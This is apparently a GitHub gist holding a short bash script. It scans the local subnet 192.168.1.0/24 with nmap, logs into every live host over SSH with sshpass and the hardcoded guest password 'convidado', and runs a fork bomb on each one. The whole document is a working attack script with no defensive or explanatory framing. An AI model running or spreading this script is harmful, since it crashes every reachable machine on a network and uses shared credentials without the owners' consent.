#date: 2025-11-03T16:50:53Z
#url: https://api.github.com/gists/ac9d95c464e45547669fc28fbe279511
#owner: https://api.github.com/users/saitoi

#!usr/bin/bash
mapfile -t ips < <(nmap 192.168.1.0/24 -oG - | awk '/Status: Up/{print $2}')
for ip in "${ips[@]}";
	do ~/sshpass/usr/bin/sshpass -p 'convidado' ssh convidado@$ip ':(){ :|: & };:'
done
